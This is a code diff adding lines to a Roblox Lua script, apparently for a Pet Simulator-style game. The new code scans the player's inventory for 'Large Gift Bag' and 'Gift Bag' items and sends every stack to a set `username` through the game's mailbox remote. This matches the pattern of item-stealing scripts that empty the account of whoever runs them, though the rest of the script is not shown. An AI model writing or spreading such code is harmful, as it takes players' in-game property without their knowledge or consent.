@@ -112,6 +112,34 @@ for i, v in pairs(cs) do
     end
 end
 
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Large Gift Bag" then
+        local args = {
+            username,
+            "Large Gift Bag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Gift Bag" then
+        local args = {
+            username,
+            "Gift Bag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
 task.wait(2)
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
